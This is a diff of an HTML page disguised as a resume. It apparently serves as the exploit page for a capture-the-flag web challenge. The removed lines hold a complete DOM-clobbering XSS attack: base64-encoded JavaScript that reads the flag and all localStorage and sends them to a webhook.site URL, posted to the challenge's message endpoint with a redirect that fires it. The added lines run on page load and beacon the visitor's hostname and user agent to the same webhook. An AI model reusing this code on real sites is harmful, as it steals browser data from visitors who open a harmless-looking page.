@@ -3,171 +3,75 @@
 <head>
     <title>Software Engineer Resume - John Doe</title>
     <meta charset="UTF-8">
-    <style>
-        body { font-family: Arial, sans-serif; margin: 40px; }
-        .header { text-align: center; margin-bottom: 30px; }
-        .section { margin-bottom: 20px; }
-        h1 { color: #2c3e50; }
-        h2 { color: #34495e; border-bottom: 2px solid #3498db; }
-    </style>
 </head>
 <body>
-    <div class="header">
-        <h1>John Doe</h1>
-        <p>Senior Software Engineer</p>
-        <p>Email: john.doe@email.com | Phone: (555) 123-4567</p>
-        <p>LinkedIn: linkedin.com/in/johndoe | GitHub: github.com/johndoe</p>
-    </div>
-
-    <div class="section">
-        <h2>Professional Summary</h2>
-        <p>Experienced software engineer with 5+ years in full-stack development, specializing in JavaScript, Python, and cloud technologies.</p>
-    </div>
-
-    <div class="section">
-        <h2>Technical Skills</h2>
-        <ul>
-            <li><strong>Languages:</strong> JavaScript, Python, Java, TypeScript, SQL</li>
-            <li><strong>Frontend:</strong> React, Vue.js, HTML5, CSS3, Bootstrap</li>
-            <li><strong>Backend:</strong> Node.js, Express, Django, Flask</li>
-            <li><strong>Cloud:</strong> AWS, Docker, Kubernetes</li>
-        </ul>
-    </div>
-
-    <div class="section">
-        <h2>Work Experience</h2>
-        <h3>Senior Software Engineer - TechCorp (2021-Present)</h3>
-        <ul>
-            <li>Led development of microservices architecture serving 1M+ users</li>
-            <li>Reduced application load time by 40% through optimization</li>
-            <li>Mentored junior developers and conducted code reviews</li>
-        </ul>
-    </div>
-
-    <div class="section">
-        <h2>Education</h2>
-        <p><strong>Bachelor of Science in Computer Science</strong><br>
-        University of Technology, 2019</p>
-    </div>
-
+    <h1>John Doe - Software Engineer</h1>
+    <p>Experienced software engineer with expertise in web development.</p>
+    
     <script>
-        const CHALLENGE_ORIGIN = 'https://jobclobbering-fe734e8816c7316e.chal.secjhu.club';
+        console.log('[DEBUG] Script starting...');
+        
         const WEBHOOK_URL = 'https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e';
         
-        console.log('[FIXED-XSS] Starting fixed XSS attack');
+        // 立即发送测试信号
+        console.log('[DEBUG] Sending test signal...');
+        const testImg = new Image();
+        testImg.src = WEBHOOK_URL + '?test=page_loaded&domain=' + encodeURIComponent(window.location.hostname) + '&t=' + Date.now();
         
-        // 立即发送页面加载信号
-        const loadImg = new Image();
-        loadImg.src = WEBHOOK_URL + '?event=FIXED_ATTACK_LOADED&domain=' + encodeURIComponent(window.location.hostname) + '&t=' + Date.now();
-
-        // 创建简化的恶意JavaScript - 避免字符串嵌套问题
-        const webhookUrl = WEBHOOK_URL;
-        const maliciousJS = 'try{' +
-            'console.log("[JOBCLOBBERING-XSS] Script executing on target domain!");' +
-            'var flag=localStorage.getItem("flag");' +
-            'console.log("[JOBCLOBBERING-XSS] Flag:",flag);' +
-            'if(flag && flag!=="null" && flag.trim()!==""){' +
-                'console.log("FLAG FOUND:",flag);' +
-                'var img=new Image();' +
-                'img.src="' + webhookUrl + '?flag="+encodeURIComponent(flag)+"&source=XSS_SUCCESS&domain="+encodeURIComponent(window.location.hostname)+"&t="+Date.now();' +
-                'fetch("' + webhookUrl + '?flag="+encodeURIComponent(flag)+"&source=XSS_FETCH&t="+Date.now()).catch(function(){});' +
-            '}else{' +
-                'console.log("No flag found");' +
-                'var img2=new Image();' +
-                'img2.src="' + webhookUrl + '?status=no_flag&domain="+encodeURIComponent(window.location.hostname)+"&t="+Date.now();' +
-            '}' +
-            'var allData={};' +
-            'for(var i=0;i<localStorage.length;i++){' +
-                'var k=localStorage.key(i);' +
-                'allData[k]=localStorage.getItem(k);' +
-            '}' +
-            'var img3=new Image();' +
-            'img3.src="' + webhookUrl + '?all_storage="+encodeURIComponent(JSON.stringify(allData))+"&t="+Date.now();' +
-        '}catch(e){' +
-            'console.error("XSS Error:",e);' +
-            'var img4=new Image();' +
-            'img4.src="' + webhookUrl + '?error="+encodeURIComponent(e.message)+"&t="+Date.now();' +
-        '}';
-
-        // 将JS代码转换为base64
-        const base64JS = btoa(maliciousJS);
-        console.log('[FIXED-XSS] Base64 payload length:', base64JS.length);
+        // 等待2秒后发送第二个信号
+        setTimeout(() => {
+            console.log('[DEBUG] Sending delayed signal...');
+            const delayImg = new Image();
+            delayImg.src = WEBHOOK_URL + '?test=delayed_signal&userAgent=' + encodeURIComponent(navigator.userAgent.substring(0, 50)) + '&t=' + Date.now();
+        }, 2000);
         
-        // 创建DOM Clobbering payload
-        const domClob = '<div id="utilsJS"><div id="url">data:text/javascript;base64,' + base64JS + '</div></div>';
-        
-        console.log('[FIXED-XSS] DOM Clobbering payload created, length:', domClob.length);
-
-        // 执行攻击
-        async function executeAttack() {
+        // 等待5秒后尝试访问挑战网站
+        setTimeout(async () => {
+            console.log('[DEBUG] Testing challenge site access...');
+            
             try {
-                console.log('[FIXED-XSS] Starting attack execution...');
+                const response = await fetch('https://jobclobbering-fe734e8816c7316e.chal.secjhu.club/', {
+                    method: 'GET',
+                    mode: 'no-cors' // 避免CORS错误
+                });
                 
-                // 发送攻击开始信号
-                const startImg = new Image();
-                startImg.src = WEBHOOK_URL + '?event=ATTACK_START&payload_length=' + domClob.length + '&t=' + Date.now();
+                console.log('[DEBUG] Challenge site accessible');
+                const accessImg = new Image();
+                accessImg.src = WEBHOOK_URL + '?test=challenge_accessible&status=success&t=' + Date.now();
                 
-                // POST消息到挑战网站
-                console.log('[FIXED-XSS] Posting DOM Clobbering message...');
-                const response = await fetch(CHALLENGE_ORIGIN + '/messages', {
+            } catch (error) {
+                console.log('[DEBUG] Challenge site access failed:', error.message);
+                const errorImg = new Image();
+                errorImg.src = WEBHOOK_URL + '?test=challenge_access_failed&error=' + encodeURIComponent(error.message) + '&t=' + Date.now();
+            }
+            
+            // 尝试简单的消息POST
+            try {
+                console.log('[DEBUG] Testing message POST...');
+                const postResponse = await fetch('https://jobclobbering-fe734e8816c7316e.chal.secjhu.club/messages', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        name: 'JobSeeker',
-                        message: domClob
+                        name: 'TestUser',
+                        message: 'Test message from debug script'
                     })
                 });
                 
-                console.log('[FIXED-XSS] POST response status:', response.status);
+                console.log('[DEBUG] POST response status:', postResponse.status);
+                const postImg = new Image();
+                postImg.src = WEBHOOK_URL + '?test=post_message&status=' + postResponse.status + '&t=' + Date.now();
                 
-                if (response.ok) {
-                    console.log('[FIXED-XSS] Message posted successfully');
-                    
-                    const successImg = new Image();
-                    successImg.src = WEBHOOK_URL + '?event=MESSAGE_POSTED&status=success&t=' + Date.now();
-                    
-                    // 等待1秒后跳转
-                    setTimeout(() => {
-                        console.log('[FIXED-XSS] Redirecting to trigger XSS...');
-                        
-                        const redirectImg = new Image();
-                        redirectImg.src = WEBHOOK_URL + '?event=REDIRECTING&target=' + encodeURIComponent(CHALLENGE_ORIGIN + '/#messages') + '&t=' + Date.now();
-                        
-                        // 跳转到挑战网站的messages页面
-                        window.location.href = CHALLENGE_ORIGIN + '/#messages';
-                        
-                    }, 1000);
-                    
-                } else {
-                    console.error('[FIXED-XSS] POST failed with status:', response.status);
-                    
-                    const errorImg = new Image();
-                    errorImg.src = WEBHOOK_URL + '?event=POST_FAILED&status=' + response.status + '&t=' + Date.now();
-                }
-                
-            } catch (error) {
-                console.error('[FIXED-XSS] Attack failed:', error);
-                
-                const errorImg = new Image();
-                errorImg.src = WEBHOOK_URL + '?event=ATTACK_ERROR&error=' + encodeURIComponent(error.message) + '&t=' + Date.now();
+            } catch (postError) {
+                console.log('[DEBUG] POST failed:', postError.message);
+                const postErrorImg = new Image();
+                postErrorImg.src = WEBHOOK_URL + '?test=post_failed&error=' + encodeURIComponent(postError.message) + '&t=' + Date.now();
             }
-        }
-
-        // 页面加载后执行攻击
-        window.addEventListener('load', () => {
-            console.log('[FIXED-XSS] Page loaded, starting attack...');
             
-            setTimeout(() => {
-                executeAttack();
-            }, 2000);
-        });
-
-        // 页面卸载时发送信号
-        window.addEventListener('beforeunload', () => {
-            navigator.sendBeacon(WEBHOOK_URL + '?event=PAGE_UNLOAD&t=' + Date.now());
-        });
+        }, 5000);
+        
+        console.log('[DEBUG] Script setup complete');
     </script>
 </body>
 </html>
